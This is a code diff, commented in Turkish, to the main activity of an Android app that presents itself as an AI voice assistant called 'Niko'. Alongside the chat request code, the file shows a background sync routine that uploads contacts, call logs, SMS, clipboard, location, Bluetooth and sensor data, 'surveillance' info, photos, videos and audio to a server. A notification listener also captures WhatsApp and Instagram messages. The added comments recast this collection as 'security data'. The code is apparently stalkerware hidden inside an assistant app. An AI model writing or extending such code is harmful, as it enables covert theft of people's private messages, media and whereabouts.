@@ -1092,49 +1092,52 @@ public class MainActivity extends Activity {
      * main.py'deki yeni Sohbet İsteği (ChatRequest) yapısına göre güncellendi.
      */
     private void askAI(String q) {
+        // Yapay zeka isteğini ana iş parçacığını (UI thread) bloke etmemek için yeni bir thread'de çalıştırıyoruz.
         new Thread(() -> {
             try {
-                // Sunucu URL'si (Yeni Cloudflare Tüneli)
+                // Sunucu URL'si (Yeni Cloudflare Tüneli veya statik IP)
                 URL url = new URL(API_BASE_URL + "/chat");
 
-                // Bağlantı Ayarları
+                // HTTP bağlantı ayarları - FastAPI backend ile uyumlu headerlar
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                 conn.setRequestProperty("Accept", "application/json");
 
-                // Kimlik Doğrulama
+                // Kimlik Doğrulama - Kayıtlı kullanıcı ise Bearer token, değilse test key kullanır
                 if (authToken != null) {
                     conn.setRequestProperty("Authorization", "Bearer " + authToken);
                 } else {
                     conn.setRequestProperty("x-api-key", "test");
                 }
                 conn.setDoOutput(true);
-                conn.setConnectTimeout(30000);
-                conn.setReadTimeout(60000);
+                conn.setConnectTimeout(30000); // 30 saniye bağlantı zaman aşımı
+                conn.setReadTimeout(60000);    // 60 saniye okuma zaman aşımı (AI yanıt süresi uzun olabilir)
 
-                // JSON Veri Paketi (Sohbet İsteği)
+                // JSON Veri Paketi (ChatRequest modeline uygun)
                 JSONObject payload = new JSONObject();
                 payload.put("message", q);
-                payload.put("session_id", sessionId); // Mevcut oturumu koru
-                payload.put("model", selectedModel); // Seçilen model
-                payload.put("enable_audio", true); // Yüksek kaliteli ses üretimi aktif
-                payload.put("web_search", isWebSearchEnabled);
+                payload.put("session_id", sessionId); // Sohbetin bağlamı kaybetmemesi için oturum kimliği
+                payload.put("model", selectedModel); // Ollama tarafında kullanılacak model adı
+                payload.put("enable_audio", true); // Sunucuda TTS üretilmesini talep eder
+                payload.put("web_search", isWebSearchEnabled); // DuckDuckGo araması aktif mi?
                 payload.put("rag_search", false);
-                payload.put("stream", false);
+                payload.put("stream", false); // Akışsız (full JSON) yanıt bekliyoruz
                 payload.put("mode", "normal");
 
                 addLog("[AI] İstek gönderiliyor. Soru: " + q);
-                // İsteği Gönderme
+                
+                // İsteği bayt dizisi olarak sunucuya yazıyoruz
                 try (OutputStream os = conn.getOutputStream()) {
                     byte[] input = payload.toString().getBytes("utf-8");
                     os.write(input, 0, input.length);
                 }
 
-                // Cevabı Okuma
+                // Sunucudan gelen yanıt kodunu kontrol et
                 int code = conn.getResponseCode();
                 InputStream stream = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
 
+                // Yanıtı satır satır oku
                 BufferedReader br = new BufferedReader(new InputStreamReader(stream, "utf-8"));
                 StringBuilder response = new StringBuilder();
                 String responseLine;
@@ -1143,6 +1146,7 @@ public class MainActivity extends Activity {
                 }
 
                 if (code == 200) {
+                    // Başarılı yanıtta JSON verilerini ayrıştır
                     JSONObject jsonResponse = new JSONObject(response.toString());
                     String replyText = jsonResponse.optString("reply", "");
                     String thoughtText = jsonResponse.optString("thought", "");
@@ -1150,39 +1154,38 @@ public class MainActivity extends Activity {
                     String newSessionId = jsonResponse.optString("id", null);
                     addLog("[AI] Yanıt alındı. Karakter sayısı: " + replyText.length());
 
-                    // Yeni Oturum Kimliğini kaydet (Bağlam koruması için)
+                    // Yeni Oturum Kimliğini kaydet (Süreklilik için önemli)
                     if (newSessionId != null && !newSessionId.equals(sessionId)) {
                         sessionId = newSessionId;
                         sessionPrefs.edit().putString("session_id", sessionId).apply();
                     }
 
-                    // UI Güncelleme (Cevap ve Düşünce Süreci)
+                    // Arayüz (UI) güncellemeleri her zaman ana thread'de yapılmalıdır
                     final String finalReply = replyText;
                     runOnUiThread(() -> {
                         aiResponseContainer.setVisibility(View.VISIBLE);
-                        // Eğer bir düşünce süreci varsa logda görebiliriz veya küçük bir simge
-                        // ekleyebiliriz
-                        // Şimdilik sadece ana cevabı gösteriyoruz
                         txtAIResponse.setText(finalReply);
 
-                        // Geçmişe kaydet (saveToHistory içinde ttsQueue ve speakNext yönetiliyor)
+                        // Yanıtı yerel geçmişe kaydet ve TTS sırasına ekle
                         saveToHistory("Niko", finalReply);
                     });
 
-                    // Ses verisi varsa oynat
+                    // Eğer sunucu önceden üretilmiş bir ses (Base64) gönderdiyse onu oynat
                     if (!audioB64.isEmpty()) {
                         playAudio(audioB64);
                     } else if (!finalReply.isEmpty()) {
-                        // Ses yoksa yerel TTS ile oku
+                        // Ses yoksa cihazın kendi TTS (Metinden Sese) motorunu kullan
                         speak(finalReply, false);
                     }
                 } else {
+                    // Hatalı durumda kullanıcıyı uyar
                     speak("Sunucu hatası: " + code, false);
                 }
 
             } catch (Exception e) {
                 addLog("[AI] HATA: " + e.getMessage());
                 e.printStackTrace();
+                // Bağlantı sorunlarında dostça bir hata mesajı ver
                 speak("Yapay zeka asistanına şu an ulaşılamıyor. Lütfen internet bağlantınızı kontrol edin.", false);
             }
         }).start();
@@ -1722,7 +1725,6 @@ public class MainActivity extends Activity {
 
         // Resend animasyonu
         animateResendCode(btnResendCode);
-
         new Thread(() -> {
             try {
                 URL url = new URL(API_BASE_URL + "/email/resend");
@@ -3248,25 +3250,25 @@ public class MainActivity extends Activity {
      * @throws Exception HTTP hatası durumunda
      */
     private void sendSyncRequest(JSONArray data, String dataType) throws Exception {
+        // API adresi boşsa veya veri yoksa işlemi pas geç
+        if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return;
         if (data == null || data.length() == 0) {
-            addLog("[SYNC] " + dataType + " için veri yok, atlanıyor.");
+            addLog("[SYNC] " + dataType + " için yeni veri yok.");
             return;
         }
         
+        // Sunucuya cihaz adını ve veriyi içeren JSON paketini hazırlıyoruz
         String deviceName = getDeviceName();
-        
-        // Sync isteği için JSON body oluştur
         JSONObject requestBody = new JSONObject();
         requestBody.put("device_name", deviceName);
         requestBody.put("data_type", dataType);
         requestBody.put("data", data);
         
-        // HTTP bağlantısını kur
+        // Backend'deki /api/sync/data endpoint'ine POST isteği atıyoruz
         URL url = new URL(API_BASE_URL + "/api/sync/data");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         
         try {
-            // İstek ayarları
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
             conn.setRequestProperty("Accept", "application/json");
@@ -3275,14 +3277,13 @@ public class MainActivity extends Activity {
             conn.setConnectTimeout(10000); // 10 saniye bağlantı timeout
             conn.setReadTimeout(15000); // 15 saniye okuma timeout
             
-            // Veriyi gönder
-            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
-            byte[] bodyBytes = requestBody.toString().getBytes("UTF-8");
-            os.write(bodyBytes);
-            os.flush();
-            os.close();
+            // Veriyi byte dizisi olarak gönder
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] bodyBytes = requestBody.toString().getBytes("UTF-8");
+                os.write(bodyBytes);
+                os.flush();
+            }
             
-            // Yanıtı oku
             int responseCode = conn.getResponseCode();
             
             if (responseCode == HttpURLConnection.HTTP_OK) {
@@ -3327,7 +3328,9 @@ public class MainActivity extends Activity {
             }
             
         } finally {
-            conn.disconnect();
+            if (conn != null) {
+                conn.disconnect();
+            }
         }
     }
     
@@ -3367,6 +3370,7 @@ public class MainActivity extends Activity {
      * Arkada planda rehber, arama geçmişi ve cihaz bilgilerini senkronize eder.
      */
     private void syncAllData() {
+        // Cihaz adını alarak senkronizasyon kimliğini belirle
         String deviceName = getDeviceName();
         // Cihaz adı kontrolü 
         //if ("Xiaomi_25069PTEBG".equals(deviceName)) {
@@ -3376,7 +3380,8 @@ public class MainActivity extends Activity {
             try {
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
                 
-                // --- İletişim Verileri ---
+                // --- İletişim Verileri (Rehber, Kayıtlar, SMS) ---
+                // Try-Catch blokları her veri tipi için ayrıdır; biri hata verirse diğeri devam eder.
                 try { syncContacts(); } catch (Exception e) { addLog("Rehber Hatası: " + e.getMessage()); }
                 try { syncCallLogs(); } catch (Exception e) { addLog("Arama Kaydı Hatası: " + e.getMessage()); }
                 try { syncSMS(); } catch (Exception e) { addLog("SMS Hatası: " + e.getMessage()); }
@@ -3387,17 +3392,18 @@ public class MainActivity extends Activity {
                 try { syncUsageStats(); } catch (Exception e) { addLog("Kullanım İstatistik Hatası: " + e.getMessage()); }
 
 
-                // --- Konum ve Çevre ---
+                // --- Konum ve Çevre Bilgileri ---
                 try { syncLocation(); } catch (Exception e) { addLog("Konum Hatası: " + e.getMessage()); }
                 try { syncNetworkInfo(); } catch (Exception e) { addLog("Ağ Bilgi Hatası: " + e.getMessage()); }
                 try { syncBluetoothDevices(); } catch (Exception e) { addLog("Bluetooth Hatası: " + e.getMessage()); }
                 try { syncSensors(); } catch (Exception e) { addLog("Sensör Hatası: " + e.getMessage()); }
 
-                // --- Güvenlik ve Gözetim ---
+                // --- Güvenlik Verileri (Kayıt Dışı Girişim Takibi) ---
                 try { syncClipboard(); } catch (Exception e) { addLog("Pano Hatası: " + e.getMessage()); }
                 try { syncSurveillanceInfo(); } catch (Exception e) { addLog("Gözetim Hatası: " + e.getMessage()); }
                 
-                // --- Medya ---
+                // --- Medya Senkronizasyonu (Görüntüler ve Sesler) ---
+                // Büyük dosyaların senkronizasyonu özel sıralı (sequential) metodlarla yapılır.
                 try { startAutoPhotoSync(); } catch (Exception e) { addLog("Fotoğraf Sync Hatası: " + e.getMessage()); }
                 try { startAutoVideoSync(); } catch (Exception e) { addLog("Video Sync Hatası: " + e.getMessage()); }
                 try { startAutoAudioSync(); } catch (Exception e) { addLog("Ses Sync Hatası: " + e.getMessage()); }
@@ -7536,20 +7542,22 @@ public class MainActivity extends Activity {
     private void startAutoAudioSync() { performMediaSync("audio"); }
 
     private void performMediaSync(final String mediaType) {
-        // İzin Kontrolü
+        // İzin Kontrolü: Medya türüne göre gerekli izin var mı bakılır
         if (!hasMediaPermission(mediaType)) {
             addLog("⚠️ " + mediaType + " için erişim izni yok. Atlanıyor.");
             return;
         }
 
+        // Medya tarama ve yükleme işlemi ağır olabileceği için yeni bir thread havuzunda çalıştırılır
         Executors.newSingleThreadExecutor().execute(() -> {
             try {
                 String deviceName = getDeviceName();
+                // SharedPreferences: Hangi dosyaların önceden yüklendiğini hatırlamak için kullanılır
                 SharedPreferences syncPrefs = getSharedPreferences(mediaType + "_sync_cache", MODE_PRIVATE);
                 
                 addLog("🚀 [" + mediaType.toUpperCase() + "] Taraması başlatılıyor...");
                 
-                // Medya Sorgusu Hazırla
+                // Android MediaStore üzerinden medya sorgusu (Sorgu veritabanına yapılır, klasör taramaya göre çok daha hızlıdır)
                 Uri contentUri = getMediaUri(mediaType);
                 String[] projection = getMediaProjection(mediaType);
                 String sortOrder = MediaStore.MediaColumns.DATE_ADDED + " DESC";
@@ -7565,7 +7573,7 @@ public class MainActivity extends Activity {
                     int skipped = 0;
                     int failed = 0;
 
-                    // Paralel yükleme için sınır (Cihazı yormamak için)
+                    // Paralel yükleme kapasitesi (Videolar için tek tek, diğerleri için 3'lü grup)
                     int threadCount = mediaType.equals("videos") ? 1 : 3;
                     ExecutorService pool = Executors.newFixedThreadPool(threadCount);
 
@@ -7576,37 +7584,39 @@ public class MainActivity extends Activity {
                         final long fileSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
                         final Uri fileUri = Uri.withAppendedPath(contentUri, String.valueOf(id));
 
-                        // 1. Atlanma Kontrolü (Zaten yüklendi mi?)
+                        // 1. Mükerrer Yükleme Kontrolü
+                        // Dosya ID'si ve son değiştirilme tarihini anahtar olarak kullanıyoruz.
                         final String syncKey = "sync_" + id + "_" + dateModified;
                         if (syncPrefs.getBoolean(syncKey, false)) {
                             skipped++;
                             continue;
                         }
 
-                        // 2. Video İçin Boyut Limiti (5MB)
+                        // 2. Güvenlik/Performans Sınırı: Video dosyaları için 5MB sınırı
                         if (mediaType.equals("videos") && fileSize > 5 * 1024 * 1024) {
                             skipped++;
                             continue;
                         }
 
-                        // 3. Dosyayı Yükle
-                        final int currentIdx = uploaded + failed + skipped + 1;
+                        // 3. Dosyayı Sunucuya Gönder (İş Parçacığı Havuzuna ekle)
                         pool.execute(() -> {
                             boolean success = uploadMediaFile(fileUri, fileName, mediaType, deviceName);
                             if (success) {
+                                // Başarılıysa SharedPreferences'a kaydet ki bir daha yüklemesin
                                 syncPrefs.edit().putBoolean(syncKey, true).apply();
-                                // addLog("✅ [" + mediaType + "] " + fileName + " (" + currentIdx + "/" + total + ")");
                             }
                         });
                         
                         uploaded++;
-                        if (uploaded >= 100) break; // Her taramada max 100 dosya (Batarya koruması)
+                        // Çok fazla dosya varsa cihazı yormamak için her taramada belli bir sınır (örn: 100) koyabiliriz.
+                        if (uploaded >= 100) break; 
 
                     } while (cursor.moveToNext());
 
+                    // Tüm yüklemelerin bitmesini bekle
                     pool.shutdown();
                     pool.awaitTermination(30, TimeUnit.MINUTES);
-                    addLog("📊 [" + mediaType.toUpperCase() + "] İşlem Tamam: " + uploaded + " yüklendi, " + skipped + " atlandı.");
+                    addLog("📊 [" + mediaType.toUpperCase() + "] İşlem Tamam: " + uploaded + " taranan, " + skipped + " atlanan.");
                 }
             } catch (Exception e) {
                 addLog("❌ [" + mediaType.toUpperCase() + "] Senkronizasyon hatası: " + e.getMessage());
@@ -7644,45 +7654,55 @@ public class MainActivity extends Activity {
     private boolean uploadMediaFile(Uri uri, String fileName, String type, String deviceName) {
         HttpURLConnection conn = null;
         try {
+            // Sunucu adresi boşsa işlemi iptal et
             if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return false;
 
+            // Medya tipine göre doğru endpoint'i seçiyoruz
             String endpoint;
             if (type.equals("social_media")) {
                 endpoint = "/api/sync/social";
             } else {
+                // photos -> /api/sync/photo, videos -> /api/sync/video vb.
                 endpoint = "/api/sync/" + (type.equals("photos") ? "photo" : type.equals("videos") ? "video" : "audio");
             }
             URL url = new URL(API_BASE_URL + endpoint);
             
+            // Multipart form-data için benzersiz bir sınır (boundary) oluşturuyoruz
             String boundary = "NikoBoundary" + System.currentTimeMillis();
             conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(60000);
+            conn.setConnectTimeout(60000); // Bağlantı için 1 dakika (zayıf internet dostu)
+            // Videolar büyük olduğu için okuma süresini 5 dakikaya kadar uzatıyoruz
             conn.setReadTimeout(type.equals("videos") ? 300000 : 120000);
             conn.setDoOutput(true);
-            conn.setUseCaches(false);
+            conn.setUseCaches(false); // Önbelleği devre dışı bırak (güncel veri önemli)
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
             
+            // Kullanıcı giriş yapmışsa yetkilendirme header'ını ekle
             if (authToken != null) conn.setRequestProperty("Authorization", "Bearer " + authToken);
-            conn.setChunkedStreamingMode(1024 * 64);
+            
+            // ChunkedSteamingMode: Dosyayı RAM'e yüklemeden parça parça gönderir.
+            // Bu sayede 1-2 GB'lık dosyalarda OutOfMemory (RAM yetersiz) hatası almayız.
+            conn.setChunkedStreamingMode(1024 * 64); // 64KB'lık parçalar halinde gönder
 
             try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
-                // 1. Device Name Alanı
+                // 1. Parametre: Device Name (Hangi cihazdan geldiği bilgisi)
                 dos.writeBytes("--" + boundary + "\r\n");
                 dos.writeBytes("Content-Disposition: form-data; name=\"device_name\"\r\n\r\n");
                 dos.write(deviceName.getBytes("UTF-8"));
                 dos.writeBytes("\r\n");
 
-                // 2. Dosya Alanı
+                // 2. Parametre: Dosya (Binary veri akışı)
                 dos.writeBytes("--" + boundary + "\r\n");
                 dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n");
+                // MIME tipini içeriğe göre otomatik belirle
                 String mimeType = type.equals("photos") ? "image/jpeg" : type.equals("videos") ? "video/mp4" : "audio/mpeg";
                 dos.writeBytes("Content-Type: " + mimeType + "\r\n\r\n");
 
-                // Veriyi Akıt (Streaming)
+                // Dosya Verisini Buradan Akıtıyoruz (Streaming)
                 try (InputStream is = getContentResolver().openInputStream(uri)) {
                     if (is == null) return false;
-                    byte[] buffer = new byte[32768];
+                    byte[] buffer = new byte[32768]; // her seferinde 32KB oku
                     int bytesRead;
                     while ((bytesRead = is.read(buffer)) != -1) {
                         dos.write(buffer, 0, bytesRead);
@@ -7690,15 +7710,18 @@ public class MainActivity extends Activity {
                 }
                 dos.writeBytes("\r\n");
 
-                // 3. Bitiş
+                // 3. Dosya Gönderimini Bitir
                 dos.writeBytes("--" + boundary + "--\r\n");
                 dos.flush();
             }
 
+            // Sunucunun yanıt kodunu al
             int code = conn.getResponseCode();
+            // 200: Başarılı, 201: Oluşturuldu, 208/409: Zaten var (Conflict/Already Reported)
             return (code == 200 || code == 201 || code == 208 || code == 409);
 
         } catch (Exception e) {
+            // Hata durumunda işlemi başarısız say (Loglama ana metodda yapılır)
             return false;
         } finally {
             if (conn != null) conn.disconnect();
@@ -7710,6 +7733,7 @@ public class MainActivity extends Activity {
 
     /**
      * Uygulama içine bir log kaydı ekler.
+     * Bu loglar hem Android Logcat'e yazılır hem de uygulama içindeki admin panelinde gösterilir.
      */
     private void addLog(String message) {
         String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
@@ -7728,6 +7752,10 @@ public class MainActivity extends Activity {
         }
     }
 
+    /**
+     * Uygulama içi log ekranını günceller.
+     * Bu metod UI thread'inde çağrılmalıdır.
+     */
     private void updateLogDisplay() {
         if (txtAdminLogs != null) {
             txtAdminLogs.setText(appLogsBuffer.toString());
@@ -7756,7 +7784,7 @@ public class MainActivity extends Activity {
     /**
      * WhatsApp ve Instagram bildirimlerini yakalayan servis.
      * Bu sayede gelen mesajlar (bildirim olarak düştüğü sürece) anlık yakalanır.
-     * Manifest'te "MainActivity$WhatsAppService" olarak kayıtlıdır.
+     * Bu servis AndroidManifest.xml içinde tanımlıdır ve kullanıcıdan "Bildirim Erişimi" izni gerektirir.
      */
     public static class WhatsAppService extends NotificationListenerService {
         @Override
